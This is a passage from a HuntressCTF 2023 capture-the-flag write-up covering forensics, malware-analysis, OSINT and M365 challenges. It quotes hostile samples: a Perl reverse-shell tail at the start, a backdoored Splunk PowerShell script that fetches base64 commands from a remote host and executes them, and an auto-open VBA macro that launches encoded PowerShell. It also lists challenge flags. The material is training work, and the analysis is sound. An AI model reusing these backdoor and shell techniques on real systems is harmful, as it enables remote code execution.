connect(SOCKET, $paddr) || die("Error: $!\n");
open(STDIN, ">&SOCKET");
open(STDOUT, ">&SOCKET");
open(STDERR, ">&SOCKET");
my $str = <<END;
begin 644 uuencode.uu
F9FQA9WLY8C5C-#,Q,V0Q,CDU.#,U-&)E-C(X-&9C9#8S9&0R-GT`
`
end
END
system('/bin/sh -i -c "echo ${string}; bash"');
close(STDIN);
close(STDOUT);
close(STDERR)

root@kali:~/ctf/HuntressCTF# vi tmp.dat

root@kali:~/ctf/HuntressCTF# cat tmp.dat
begin 644 uuencode.uu
F9FQA9WLY8C5C-#,Q,V0Q,CDU.#,U-&)E-C(X-&9C9#8S9&0R-GT`
`
end

root@kali:~/ctf/HuntressCTF# file tmp.dat
tmp.dat: uuencoded or xxencoded text, file name "uuencode.uu", ASCII text
```

uudecode it, got flag.

```console
root@kali:~/ctf/HuntressCTF# apt install sharutils
(snip)
root@kali:~/ctf/HuntressCTF# uudecode tmp.dat

root@kali:~/ctf/HuntressCTF# cat uuencode.uu
flag{9b5c4313d12958354be6284fcd63dd26}
```

- [Uuencode Command Linux](https://linuxhint.com/uuencode-command-linux/)
- [cheat.sh/uudecode](https://cheat.sh/uudecode)

## Layered Security

### Description

> It takes a team to do security right, so we have layered our defenses!
>
> Download the file(s) below.
>
> Attachments: layered_security

### Flag

flag{9a64bc4a390cb0ce31452820ee562c3f}

### Solution

```console
$ file layered_security
layered_security: GIMP XCF image data, version 011, 1024 x 1024, RGB Color
```

1. Open layered_security with GIMP
2. Show `Pasted Layer #3` layer only, there is the flag in it.

![layered_security.png](img/layered_security.png)

## Backdoored Splunk

### Description

> You've probably seen Splunk being used for good, but have you seen it used for evil?
>
> NOTE: the focus of this challenge should be on the downloadable file below. It uses the dynamic service that is started, but you must put the puzzle pieces together to be retrieve the flag. The connection error to the container is part of the challenge.
>
> Download the file(s) below and press the Start button on the top-right to begin this challenge.
>
> Attachments: Splunk_TA_windows.zip

### Flag

flag{60bb3bfaf703e0fa36730ab70e115bd7}

### Solution

Splunk_TA_windows/bin/powershell/nt6-health.ps1

```powershell
# (snip)

#
# Windows Version and Build #
#
$WindowsInfo = Get-Item "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion"
# $PORT below is dynamic to the running service of the `Start` button
$OS = @($html = (Invoke-WebRequest http://chal.ctf.games:$PORT -Headers @{Authorization=("Basic YmFja2Rvb3I6dXNlX3RoaXNfdG9fYXV0aGVudGljYXRlX3dpdGhfdGhlX2RlcGxveWVkX2h0dHBfc2VydmVyCg==")} -UseBasicParsing).Content
if ($html -match '<!--(.*?)-->') {
    $value = $matches[1]
    $command = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($value))
    Invoke-Expression $command
})

# (snip)
```

Sending request with the above token.

```console
root@kali:~/ctf/HuntressCTF# curl -D- http://chal.ctf.games:31971 -H "Authorization: Basic YmFja2Rvb3I6dXNlX3RoaXNfdG9fYXV0aGVudGljYXRlX3dpdGhfdGhlX2RlcGxveWVkX2h0dHBfc2VydmVyCg=="
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 69

<!-- ZWNobyBmbGFnezYwYmIzYmZhZjcwM2UwZmEzNjczMGFiNzBlMTE1YmQ3fQ== -->

root@kali:~/ctf/HuntressCTF# echo -ne 'ZWNobyBmbGFnezYwYmIzYmZhZjcwM2UwZmEzNjczMGFiNzBlMTE1YmQ3fQ==' | base64 -d
echo flag{60bb3bfaf703e0fa36730ab70e115bd7}
```

## Dumpster Fire

### Description

> We found all this data in the dumpster! Can you find anything interesting in here, like any cool passwords or anything? Check it out quick before the foxes get to it!
>
> Download the file(s) below.
>
> Attachments: dumpster_fire.tar.xz

### Flag

flag{35446041dc161cf5c9c325a3d28af3e3}

### Solution

Dumped password in Firefox Profile directory by using [Firefox Decrypt](https://github.com/unode/firefox_decrypt).

```console
root@kali:~/ctf/HuntressCTF# mkdir tmp && tar xJf dumpster_fire.tar.xz -C tmp

root@kali:~/ctf/HuntressCTF# git clone https://github.com/unode/firefox_decrypt.git
(snip)
root@kali:~/ctf/HuntressCTF# python3 firefox_decrypt/firefox_decrypt.py tmp/home/challenge/.mozilla/firefox/bc1m1zlr.default-release
2023-10-08 22:13:26,154 - WARNING - profile.ini not found in tmp/home/challenge/.mozilla/firefox/bc1m1zlr.default-release
2023-10-08 22:13:26,155 - WARNING - Continuing and assuming 'tmp/home/challenge/.mozilla/firefox/bc1m1zlr.default-release' is a profile location

Website:   http://localhost:31337
Username: 'flag'
Password: 'flag{35446041dc161cf5c9c325a3d28af3e3}'
```

## Comprezz

### Description

> Someone stole my S's and replaced them with Z's! Have you ever seen this kind of file before?
>
> Download the file(s) below.
>
> Attachments: comprezz

### Flag

flag{196a71490b7b55c42bf443274f9ff42b}

### Solution

```console
root@kali:~/ctf/HuntressCTF# file comprezz
comprezz: compress'd data 16 bits

root@kali:~/ctf/HuntressCTF# cat comprezz | uncompress
flag{196a71490b7b55c42bf443274f9ff42b}
```

## Chicken Wings

### Description

> ordered chicken wings at the local restaurant, but uh... this really isn't what I was expecting...
>
> Download the file(s) below.
>
> Attachments: chicken_wings

### Flag

flag{e0791ce68f718188c0378b1c0a3bdc9e}

### Solution

```console
root@kali:~/ctf/HuntressCTF# file chicken_wings
chicken_wings: Unicode text, UTF-8 text, with no line terminators

root@kali:~/ctf/HuntressCTF# cat chicken_wings
♐●♋♑❀♏📁🖮🖲📂♍♏⌛🖰♐🖮📂🖰📂🖰🖰♍📁🗏🖮🖰♌📂♍📁♋🗏♌♎♍🖲♏❝
```

Used [Wingdings Font Translator](https://www.dcode.fr/wingdings-font), got flag.

## Where am I?

### Description

> Your friend thought using a JPG was a great way to remember how to login to their private server. Can you find the flag?
>
> Download the file(s) below.
>
> Attachments: PXL_20230922_231845140_2.jpg

### Flag

flag{b11a3f0ef4bc170ba9409c077355bba2}

### Solution

```console
root@kali:~/ctf/HuntressCTF# file PXL_20230922_231845140_2.jpg
PXL_20230922_231845140_2.jpg: JPEG image data, Exif standard: [TIFF image data, little-endian, direntries=14, height=4000, description=ZmxhZ3tiMTFhM2YwZWY0YmMxNzBiYTk0MDljMDc3MzU1YmJhMik=, manufacturer=Google, model=Pixel Fold, orientation=upper-left, xresolution=260, yresolution=268, resolutionunit=2, software=HDR+ 1.0.540104767zd, datetime=2023:09:22 19:18:45, GPS-Data, width=3000], baseline, precision 8, 3000x4000, components 3

root@kali:~/ctf/HuntressCTF# echo -ne 'ZmxhZ3tiMTFhM2YwZWY0YmMxNzBiYTk0MDljMDc3MzU1YmJhMik=' | base64 -d | sed -e 's/)/}/'
flag{b11a3f0ef4bc170ba9409c077355bba2}
```

## F12

### Description

> Remember when Missouri got into hacking!?! You gotta be fast to catch this flag!
>
> Press the Start button on the top-right to begin this challenge.

### Flag

flag{03e8ba07d1584c17e69ac95c341a2569}

### Solution

```console
root@kali:~/ctf/HuntressCTF# curl -s http://chal.ctf.games:32522/ | grep -i flag
                <button type="button" onclick="ctf()" class="btn btn-primary"><h1>Capture The Flag</button>
            window.open("./capture_the_flag.html", 'Capture The Flag', 'width=400,height=100%,menu=no,toolbar=no,location=no,scrollbars=yes');

root@kali:~/ctf/HuntressCTF# curl -s http://chal.ctf.games:32522/capture_the_flag.html | grep -i flag
                <button type="button" onclick="ctf()" class="btn btn-success"><h1>Your flag is:<br>
                  flag{03e8ba07d1584c17e69ac95c341a2569}
```

## Wimble

### Description

> "Gretchen, stop trying to make fetch happen! It's not going to happen!" - Regina George, Mean Girls
>
> Download the files below.
>
> Attachments: wimble.7z

### Flag

FLAG{97F33C9783C21DF85D79D613B0B258BD}

### Solution

```console
root@kali:~/ctf/HuntressCTF# 7z e wimble.7z
(snip)
root@kali:~/ctf/HuntressCTF# file fetch
fetch: Windows imaging (WIM) image v1.13, XPRESS compressed, reparse point fixup

root@kali:~/ctf/HuntressCTF# wimlib-imagex info fetch
WIM Information:
----------------
Path:           fetch
GUID:           0x2e2668f5d8e16c4f8b3415b70c02fe86
Version:        68864
Image Count:    1
Compression:    XPRESS
Chunk Size:     32768 bytes
Part Number:    1/1
Boot Index:     0
Size:           6144026 bytes
Attributes:     Relative path junction

Available Images:
-----------------
Index:                  1
Name:                   Fetch
Description:
Directory Count:        1
File Count:             272
Total Bytes:            7337140
Hard Link Bytes:        0
Creation Time:          Wed May 31 09:31:49 2023 UTC
Last Modification Time: Wed May 31 09:31:49 2023 UTC
WIMBoot compatible:     no

root@kali:~/ctf/HuntressCTF# wimlib-imagex dir fetch | less

root@kali:~/ctf/HuntressCTF# wimlib-imagex dir fetch | grep fetch.zip
/fetch.zip

root@kali:~/ctf/HuntressCTF# wimlib-imagex extract fetch 1 fetch.zip
[WARNING] Ignoring FILE_ATTRIBUTE_NOT_CONTENT_INDEXED of 1 files
[WARNING] Ignoring Windows NT security descriptors of 1 files
[WARNING] Ignoring object IDs of 1 files
Extracting file data: 2918 KiB of 2918 KiB (100%) done
Done extracting files.

root@kali:~/ctf/HuntressCTF# file fetch.zip
fetch.zip: Zip archive data, at least v2.0 to extract, compression method=deflate
```

Copied fetch.zip to Windows machine. I used PECmd in [Eric Zimmerman's tools](https://ericzimmerman.github.io/#!index.md).

```console
PS C:\Users\root\Desktop\huntressctf\PECmd> .\PECmd.exe -d C:\Users\root\Desktop\huntressctf\fetch\ --csv .
(snip))
---------- Processed C:\Users\root\Desktop\huntressctf\fetch\WWAHOST.EXE-493FDBE7.pf in 0.63386910 seconds ----------
Processed 257 out of 260 files in 54.5168 seconds

Failed files
  C:\Users\root\Desktop\huntressctf\fetch\DLLHOST.EXE-5A1B6910.pf ==> (Invalid signature! Should be 'SCCA')
  C:\Users\root\Desktop\huntressctf\fetch\MOBSYNC.EXE-B307E1CC.pf ==> (Invalid signature! Should be 'SCCA')
  C:\Users\root\Desktop\huntressctf\fetch\SVCHOST.EXE-04F53BBC.pf ==> (Invalid signature! Should be 'SCCA')

CSV output will be saved to .\20231010133509_PECmd_Output.csv
CSV time line output will be saved to .\20231010133509_PECmd_Output_Timeline.csv
```

Greped `20231010133509_PECmd_Output.csv`, got flag.

```console
$ grep -Eoi 'flag{[0-9a-f]{32}}' 20231010133509_PECmd_Output.csv
FLAG{97F33C9783C21DF85D79D613B0B258BD}
```

FYI: Similer CTF Writeup: [CTFtime.org / Hacktober CTF / Prefetch Perfection / Writeup](https://ctftime.org/writeup/24252)

## VeeBeeEee

### Description

> While investigating a host, we found this strange file attached to a scheduled task. It was invoked with wscript or something... can you find a flag?
>
> NOTE, this challenge is based off of a real malware sample. We have done our best to "defang" the code, but out of abudance of caution it is strongly encouraged you only analyze this inside of a virtual environment separate from any production devices.
>
> Download the file(s) below.
>
> Attachments: veebeeeee

### Flag

flag{ed81d24958127a2adccfb343012cebff}

### Solution

I guess `veebeeeee` is a .vbe (VBScript) file.

1. rename veebeeeee to veebeeeee.vbe
2. upload it to <https://master.ayra.ch/vbs/vbs.aspx> to decrypt and download veebeeeee.vbs

```console
$ cat veebeeeee.vbs | sed -e 's/&//g'
(snip)
Reqest1 = "https://past"''''''''''''''''al37ysoeopm'al37ysoeopm
Reqest2 = "ebin.com/raw"''''''''''''''''al37ysoeopm'al37ysoeopm
Reqest3 = "/SiYGwwcz"''''''''''''''''al37ysoeopm'al37ysoeopm
Reqest4 = "' -ou"''''''''''''''''al37ysoeopm'al37ysoeopm
(snip)
```

Concatenated `Reqest1`, `Reqest2` and `Reqest3` variables, Got `https://pastebin.com/raw/SiYGwwcz` URL.

```console
$ curl https://pastebin.com/raw/SiYGwwcz
<!-- flag{ed81d24958127a2adccfb343012cebff} -->
```

## Baking

### Description

> Do you know how to make cookies? How about HTTP flavored?
>
> Press the Start button in the top-right to begin this challenge.
>
> Connect with:
>
> <http://chal.ctf.games:30484>

### Flag

flag{c36fb6ebdbc2c44e6198bf4154d94ed4}

### Solution

```console
root@kali:~/ctf/HuntressCTF# echo -ne '{"recipe": "Magic Cookies", "time": "1/1/2000, 00:00:00"}' | base64
eyJyZWNpcGUiOiAiTWFnaWMgQ29va2llcyIsICJ0aW1lIjogIjEvMS8yMDAwLCAwMDowMDowMCJ9

root@kali:~/ctf/HuntressCTF# curl -i -s -k -b $'in_oven=eyJyZWNpcGUiOiAiTWFnaWMgQ29va2llcyIsICJ0aW1lIjogIjEvMS8yMDAwLCAwMDowMDowMCJ9' $'http://chal.ctf.games:30484/' | grep -Eo 'flag\{[0-9a-f]{32}\}'
flag{c36fb6ebdbc2c44e6198bf4154d94ed4}
```

## Operation Not Found

### Description

> In the boundless web of data, some corners echo louder than others, whispering tales of innovation, deep knowledge, and fierce competition. On the lush landscapes of <https://osint.golf/>, a corner awaits your discovery... where intellect converges with spirit, and where digital foundations stand alongside storied arenas.
>
> This is the `chall1` challenge for the "HuntressCTF2023" challenges on <https://osint.golf>. It's a lot like Geoguesser if you have ever played :)
>
> - Navigate to OSINT Golf and select the `chall1` challenge.
> - You will see an interface similar to Google Street View, where you can look around and zoom in on your surroundings. Try and determine your location on the map of the earth!
> - Move your mouse over the minimap in the bottom-right corner, and scroll to zoom or click and hold to pan around the map.
> - Click and place your pin-marker on the map where you believe your exact location is. The accuracy radius is 200 meters.
> - Click **Submit**. If you are incorrect, it will say "not here" on the top left. If you are correct, your flag will be displayed in the top-left corner.
> - Copy and paste the flag value into the input box below and submit it to solve this challenge!
>
> Connect here: <https://osint.golf/HuntressCTF2023-chall1/>

### Flag

 flag{c46b7183c9810ec4ddb31b2fdc6a914c}

### Solution

This challenge is OSINT.
Cropped out the images of nearby buildings and image searched.
Found [Crosland Tower](https://news.gatech.edu/news/2019/01/11/georgia-tech-library-opens-refurbished-crosland-tower).

Same Location: <https://maps.app.goo.gl/gR3A9tcTwTy6d57T9>

## Snake Eater

### Description

> Hey Analyst, I've never seen an executable icon that looks like this. I don't like things I'm not familiar with. Can you check it out and see what it's doing?
>
> Archive password: infected
>
> NOTE, this challenge is based off of a real malware sample. Windows Defender will probably identify it as malicious. It is strongly encouraged you only analyze this inside of a virtual environment separate from any production devices.
>
> Download the file(s) below.
>
> Attachments: snake_eater.7z

### Flag

flag{d1343a2fc5d8427801dd1fd417f12628}

### Solution

- Download [Process Monitor](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon) and run it
- Create filter `Process Name`, `is`, `snake_eater.exe`
  ![snake_eater_procmon1.png](img/snake_eater_procmon1.png)
- Clear (Ctrl+X) and Capture (Ctrl+E)
- Run `snake_eater.exe`
- Search `flag{` and found `C:\Users\root\AppData\Roaming\LibreOffice\4\user\extensions\shared\registry\com.sun.star.comp.deployment.configuration.PackageRegistryBackend\flag{d1343a2fc5d8427801dd1fd417f12628}` path.
  ![snake_eater_procmon2.png](img/snake_eater_procmon2.png)

## Opendir

### Description

> A threat actor exposed an open directory on the public internet! We could explore their tools for some further intelligence. Can you find a flag they might be hiding?
>
> NOTE: This showcases genuine malware samples found a real opendir. For domain reputation purposes, this is behind Basic Authentication with credentials: opendir:opendir
>
> Press the Start button on the top-right to begin this challenge.

### Flag

flag{9eb4ebf423b4e5b2a88aa92b0578cbd9}

### Solution

Accessed to this challenge URL with `opendir:opendir` credential for Basic Auth.

![opendir_1.png](./img/opendir_1.png)

Downloaded all files with `wget` and greped flag.

```console
root@kali:~/ctf/HuntressCTF# wget -q -r --http-user=opendir --http-passwd=opendir http://chal.ctf.games:31085/

root@kali:~/ctf/HuntressCTF# grep -oE 'flag{[0-9a-f]{32}}' -R .
./chal.ctf.games:31085/sir/64_bit_new/oui.txt:flag{9eb4ebf423b4e5b2a88aa92b0578cbd9}
```

## Under The Bridge

### Description

> Can you find this iconic location?
>
> This is the **chall2** challenge for the "HuntressCTF2023" challenges on <https://osint.golf>. It's a lot like Geoguesser if you have ever played :)
>
> - Navigate to OSINT Golf and select the **chall2** challenge.
> - You will see an interface similar to Google Street View, where you can look around and zoom in on your surroundings. Try and determine your location on the map of the earth!
> - Move your mouse over the minimap in the bottom-right corner, and scroll to zoom or click and hold to pan around the map.
> - Click and place your pin-marker on the map where you believe your exact location is. The accuracy radius is 200 meters.
> - Click Submit. If you are incorrect, it will say "not here" on the top left. If you are correct, your flag will be displayed in the top-left corner.
> - Copy and paste the flag value into the input box below and submit it to solve this challenge!
>
>
> Connect here: <https://osint.golf/HuntressCTF2023-chall2/>

### Flag

flag{fdc8cd4cff2c19e0d1022e78481ddf36}

### Solution

This place is Rick Astley bridge in [the MV](https://youtu.be/dQw4w9WgXcQ?si=JTb6pJncd0hK1qDA&t=8).

Same location: <https://maps.app.goo.gl/VcLg4118jE3SmmgPA>

## Land Before Time

### Description

> This trick is nothing new, you know what to do: iSteg. Look for the tail that's older than time, this Spike, you shouldn't climb.
>
> Download the file(s) below.
>
> Attachments: dinosaurs1.png

### Flag

flag{da1e2bf9951c9eb1c33b1d2008064fee}

### Solution

Used [iSteg](https://github.com/rafiibrahim8/iSteg/releases/tag/v2.1), got flag.

![land_before_time.png](img/land_before_time.png)

## Opposable Thumbs

### Description

> We uncovered a database. Perhaps the flag is right between your fingertips!
>
> NOTE: this flag does NOT follow the standard MD5 hash format, but does have the usual flag{} prefix and suffix.
>
> Download the file(s) below.
>
> Attachments: thumbcache_256.db

### Flag

flag{human_after_all}

### Solution

Used [Thumbcache Viewer](https://thumbcacheviewer.github.io/), got flag.

![opposable_thumbs.png](img/opposable_thumbs.png)

## Rock, Paper, Psychic

### Description

> Wanna play a game of rock, paper, scissors against a computer that can read your mind? Sounds fun, right?
>
> NOTE: this challenge binary is not malicious, but Windows Defender will likely flag it as malicious anyway. Please don't open it anywhere that you don't want a Defender alert triggering.
>
> Download the file(s) below.
>
> Attachments: rock_paper_psychic.7z

### Flag

flag{35bed450ed9ac9fcb3f5f8d547873be9}

### Solution

```console
root@kali:~/ctf/HuntressCTF# 7z e rock_paper_psychic.7z
(snip)
root@kali:~/ctf/HuntressCTF# tree .
.
├── rock_paper_psychic.7z
└── rock_paper_psychic.exe

1 directory, 2 files

root@kali:~/ctf/HuntressCTF# wine ./rock_paper_psychic.exe
[#] Hi! I'm Patch, the Telepathic Computer Program.
[#] Let's play Rock, Paper, Scissors!
[#] I should warn you ahead of time, though.
[#] As I previously mentioned, I'm telepathic. So I can read your mind.
[#] You won't end up beating me.
[#] Still want to play? Alright, you've been warned!
[#] Enter your choice (rock, paper, scissors):
[>] rock
[#] I've made my choice! Now let's play!
[#] Ready?
[#] ROCK
[#] PAPER
[#] SCISSORS
[#] SHOOT!
[#] I chose: paper
[#] You chose: rock
[#] I win!
[#] What's so hard to understand? I. CAN. READ. MINDS.
[?] Do you want to play again? (yes/no)
[yes/no] > yes
[#] Enter your choice (rock, paper, scissors):
[>] paper
[#] I've made my choice! Now let's play!
[#] Ready?
[#] ROCK
[#] PAPER
[#] SCISSORS
[#] SHOOT!
[#] I chose: scissors
[#] You chose: paper
[#] I win!
[#] What's so hard to understand? I. CAN. READ. MINDS.
[?] Do you want to play again? (yes/no)
[yes/no] >
```

I couldn't win no matter how many times I try.
I will try to win by modifying the register with the debugger.

1. In Windows, Download [x64gdb](https://x64dbg.com/) ([download link](https://sourceforge.net/projects/x64dbg/files/snapshots/snapshot_2023-10-05_13-38.zip/download>)) and extract the zip archive
2. Run x64gdb.exe
3. File > Open and Select `rock_paper_psychic.exe`
4. Run
5. Set breakpoint `416BE4`
6. Run
7. Enter `rock` (or `paper`, `scissors`) in prompt
8. Change RAX register
   ![rock_paper_psychic_1.png ](img/rock_paper_psychic_1.png)
9. Run
   ![rock_paper_psychic_2.png](img/rock_paper_psychic_2.png)

## Tragedy Redux

### Description

> We found this file as part of an attack chain that seemed to manipulate file contents to stage a payload. Can you make any sense of it?
>
> Archive password: infected
>
> Download the file(s) below.
> Attachments: tragedy_redux.7z

### Flag

flag{63dcc82c30197768f4d458da12f618bc}

### Solution

```console
root@kali:~/ctf/HuntressCTF/tragedy# 7z -otragedy_redux e tragedy_redux.7z
(snip)
root@kali:~/ctf/HuntressCTF/tragedy# tree tragedy_redux
tragedy_redux
└── tragedy_redux

1 directory, 1 file

root@kali:~/ctf/HuntressCTF/tragedy# file tragedy_redux/tragedy_redux
tragedy_redux/tragedy_redux: Zip archive data, made by v4.5, extract using at least v2.0, last modified, last modified Sun, Jan 01 1980 00:00:00, uncompressed size 1453, method=deflate

root@kali:~/ctf/HuntressCTF/tragedy# unzip tragedy_redux/tragedy_redux
Archive:  tragedy_redux/tragedy_redux
file #1:  bad zipfile offset (local header sig):  0
  inflating: _rels/.rels
  inflating: word/document.xml
  inflating: word/_rels/document.xml.rels
  inflating: word/vbaProject.bin
  inflating: word/theme/theme1.xml
  inflating: word/_rels/vbaProject.bin.rels
  inflating: word/vbaData.xml
  inflating: word/settings.xml
  inflating: word/styles.xml
  inflating: word/webSettings.xml
  inflating: word/fontTable.xml
  inflating: docProps/core.xml
  inflating: docProps/app.xml


root@kali:~/ctf/HuntressCTF/tragedy# file word/vbaProject.bin
word/vbaProject.bin: Composite Document File V2 Document, Cannot read section info

root@kali:~/ctf/HuntressCTF/tragedy# git clone https://github.com/DidierStevens/DidierStevensSuite.git
(snip)
root@kali:~/ctf/HuntressCTF/tragedy# python3 ./DidierStevensSuite/oledump.py word/vbaProject.bin -v -s 3 > vbaProject.vba
```

vbaProject.vba

```vba
Attribute VB_Name = "NewMacros"
Function Pears(Beets)
    Pears = Chr(Beets - 17)
End Function

Function Strawberries(Grapes)
    Strawberries = Left(Grapes, 3)
End Function

Function Almonds(Jelly)
    Almonds = Right(Jelly, Len(Jelly) - 3)
End Function

Function Nuts(Milk)
    Do
    OatMilk = OatMilk + Pears(Strawberries(Milk))
    Milk = Almonds(Milk)
    Loop While Len(Milk) > 0
    Nuts = OatMilk
End Function


Function Bears(Cows)
    Bears = StrReverse(Cows)
End Function

Function Tragedy()

    Dim Apples As String
    Dim Water As String

    If ActiveDocument.Name <> Nuts("131134127127118131063117128116") Then
        Exit Function
    End If

    Apples = "129128136118131132121118125125049062118127116049091088107132106104116074090126107132106104117072095123095124106067094069094126094139094085086070095139116067096088106065107085098066096088099121094101091126095123086069106126095074090120078078"
    Water = Nuts(Apples)


    GetObject(Nuts("136122127126120126133132075")).Get(Nuts("104122127068067112097131128116118132132")).Create Water, Tea, Coffee, Napkin

End Function

Sub AutoOpen()
    Tragedy
End Sub
```

Implementing Python version:

solver.py

```python
def pears(beets):
    return chr(beets - 17)


def strawberries(grapes):
    return grapes[:3]


def almonds(jelly):
    return jelly[3:]


def nuts(milk):
    oat_milk = ""
    while len(milk) > 0:
        oat_milk += pears(int(strawberries(milk)))
        milk = almonds(milk)

    # same here:
    # oat_milk = ""
    # for i in range(0, len(milk), 3):
    #     oat_milk += chr((int(milk[i : i + 3])) - 17)

    return oat_milk


def tragedy():
    apples = "129128136118131132121118125125049062118127116049091088107132106104116074090126107132106104117072095123095124106067094069094126094139094085086070095139116067096088106065107085098066096088099121094101091126095123086069106126095074090120078078"
    water = nuts(apples)

    print(water)


def auto_open():
    tragedy()


if __name__ == "__main__":
    auto_open()
```

```console
root@kali:~/ctf/HuntressCTF/tragedy# python3 solver.py
powershell -enc JGZsYWc9ImZsYWd7NjNkY2M4MmMzMDE5Nzc2OGY0ZDQ1OGRhMTJmNjE4YmN9Ig==

root@kali:~/ctf/HuntressCTF/tragedy# echo -ne 'JGZsYWc9ImZsYWd7NjNkY2M4MmMzMDE5Nzc2OGY0ZDQ1OGRhMTJmNjE4YmN9Ig==' | base64 -d
$flag="flag{63dcc82c30197768f4d458da12f618bc}"
```

## Rogue Inbox

### Description

> You've been asked to audit the Microsoft 365 activity for a recently onboarded as a customer of your MSP.
>
> Your new customer is afraid that Debra was compromised. We received logs exported from Purview... can you figure out what the threat actor did? It might take some clever log-fu!
>
> Download the file(s) below.
> Attachments: purview.csv

### Flag

flag{24c4230fa7d50eef392b2c850f74b0f6}

### Solution

```console
root@kali:~/ctf/HuntressCTF# grep flag@ctf.com purview.csv | grep -o '757cb79-dd91-4555-a45e-520c2525d932\\\\[a-zA-Z0-9{}]' | rev | cut -c1 | tr -d '\n'
flag{24c4230fa7d50eef392b2c850f74b0f6}
```

## M Three Sixty Five

In `M Three Sixty Five` challenge series, it provides the environment in which [AADInternals](https://aadinternals.com/aadinternals/) was setup.

### M Three Sixty Five - Start Here

#### Description

> M Three Sixty Five - Start Here
>
> NOTE: This is the challenge portal that will start the deployable container environment for the "M Three Sixty Five" challenge set below.
>
> There is no flag for this challenge itself.
>
> Connect with SSH, with username user and SSH password userpass. Your syntax may look like: ssh <user@chal.ctf.games> -p [PORTNUMBER]
>
> When you connect to the session for the very first time, you will be authenticated into a Microsoft 365 environment. WARNING: Once you disconnect, you will need to restart your container to reauthenticate Press the Start button on the top-right to begin this challenge.

### M Three Sixty Five - General Info

#### Description

> Welcome to our hackable M365 tenant! Can you find any juicy details, like perhaps the street address this organization is associated with?

#### Flag

flag{dd7bf230fde8d4836917806aff6a6b27}

#### Solution

```console
PS /home/user> Get-AADIntTenantDetails

odata.type                                : Microsoft.DirectoryServices.TenantDetail
objectType                                : Company
objectId                                  : 05985beb-42bc-4c24-bf49-c1730a825406
deletionTimestamp                         :
assignedPlans                             : {@{assignedTimestamp=09/16/2023 06:40:21; capabilityStatus=Enabled; service=exchange; servicePlanId=9f431833-0334-42de-a7dc-70aa40db46db}, @{assignedTimestamp=09/16/2023 06:40:21; capabilitySta
                                            tus=Enabled; service=exchange; servicePlanId=5136a095-5cf0-4aff-bec3-e84448b38ea5}, @{assignedTimestamp=09/16/2023 06:40:17; capabilityStatus=Enabled; service=M365LabelAnalytics; servicePlanId=
                                            d9fa6af4-e046-4c89-9226-729a0786685d}, @{assignedTimestamp=09/16/2023 06:40:19; capabilityStatus=Enabled; service=MicrosoftCommunicationsOnline; servicePlanId=0feaeb32-d00e-4d66-bd5a-43b5b83db8
                                            2c}…}
authorizedServiceInstance                 : {exchange/namprd04-012-01, ccibotsprod/NA001, YammerEnterprise/NA030, WhiteboardServices/NA001…}
city                                      : Ellicott City
cloudRtcUserPolicies                      :
companyLastDirSyncTime                    :
companyTags                               : {o365.microsoft.com/startdate=638304432108764015, azure.microsoft.com/developer365=active, o365.microsoft.com/version=15, o365.microsoft.com/signupexperience=GeminiSignUpUI}
compassEnabled                            :
country                                   :
countryLetterCode                         : US
dirSyncEnabled                            :
displayName                               : HuntressCTF
isMultipleDataLocationsForServicesEnabled :
marketingNotificationEmails               : {}
postalCode                                : 21043
preferredLanguage                         : en
privacyProfile                            :
provisionedPlans                          : {@{capabilityStatus=Enabled; provisioningStatus=Success; service=exchange}, @{capabilityStatus=Enabled; provisioningStatus=Success; service=exchange}, @{capabilityStatus=Enabled; provisioningSt
                                            atus=Success; service=exchange}, @{capabilityStatus=Enabled; provisioningStatus=Success; service=exchange}…}
provisioningErrors                        : {}
releaseTrack                              :
replicationScope                          : NA
securityComplianceNotificationMails       : {}
securityComplianceNotificationPhones      : {}
selfServePasswordResetPolicy              :
state                                     : MD
street                                    : flag{dd7bf230fde8d4836917806aff6a6b27}
technicalNotificationMails                : {huntressctf@outlook.com}
telephoneNumber                           : 8005555555
tenantType                                :
createdDateTime                           : 09/16/2023 06:40:09
verifiedDomains                           : {@{capabilities=Email, OfficeCommunicationsOnline; default=True; id=000520000FC960F2; initial=True; name=4rhdc6.onmicrosoft.com; type=Managed}}
windowsCredentialsEncryptionCertificate   :
```

### M Three Sixty Five - Conditional Access

#### Description

> This tenant looks to have some odd [Conditional Access Policies](https://learn.microsoft.com/en-us/azure/active-directory/conditional-access/overview). Can you find a weird one?

#### Flag

flag{d02fd5f79caa273ea535a526562fd5f7}

#### Solution

```console
PS /home/user> Get-AADIntConditionalAccessPolicies

odata.type          : Microsoft.DirectoryServices.Policy
objectType          : Policy
objectId            : 668225f8-1b04-4c50-ad93-a96234c9e630
deletionTimestamp   :
displayName         : flag{d02fd5f79caa273ea535a526562fd5f7}
keyCredentials      : {}
policyType          : 18
policyDetail        : {{"Version":1,"CreatedDateTime":"2023-10-16T15:23:45.8269524Z","ModifiedDateTime":"2023-10-16T15:38:14.8630673Z","State":"Enabled","Conditions":{"Applications":{"Include":[{"Applications":["None"]}]},"Users":{"Inclu
                      de":[{"Users":["None"]}]}},"Controls":[{"Control":["Mfa"]}],"EnforceAllPoliciesForEas":true,"IncludeOtherLegacyClientTypeForEvaluation":true}}
policyIdentifier    :
tenantDefaultPolicy :

odata.type          : Microsoft.DirectoryServices.Policy
objectType          : Policy
objectId            : 781fecfa-78c7-41b3-9961-fd82132465e3
deletionTimestamp   :
displayName         : Default Policy
keyCredentials      : {}
policyType          : 18
policyDetail        : {{"Version":0,"State":"Disabled"}}
policyIdentifier    : 10/16/2023 15:38:15
tenantDefaultPolicy : 18
```

### M Three Sixty Five - Teams

#### Description

> We observed saw some sensitive information being shared over a Microsoft Teams message! Can you track it down?

#### Flag

flag{f17cf5c1e2e94ddb62b98af0fbbd46e1}

#### Solution

<https://aadinternals.com/aadinternals/#get-aadintteamsmessages-t>

```console
PS /home/user> Get-AADIntTeamsMessages | Format-Table id,content,deletiontime,*type*,DisplayName

Id            Content                                DeletionTime MessageType Type    DisplayName
--            -------                                ------------ ----------- ----    -----------
1695838171758 flag{f17cf5c1e2e94ddb62b98af0fbbd46e1}              Text        Message FNU LNU
```

### M Three Sixty Five - The President

#### Description

> One of the users in this environment seems to have unintentionally left some information in their account details. Can you track down The President?

#### Flag

flag{1e674f0dd1434f2bb3fe5d645b0f9cc3}

#### Solution

```console
PS /home/user> Get-AADIntUsers | Select UserPrincipalName,ObjectId,ImmutableId

UserPrincipalName                       ObjectId                             ImmutableId
-----------------                       --------                             -----------
LeeG@4rhdc6.onmicrosoft.com             0b838a0a-f67c-448b-8731-ee3ddb18a605
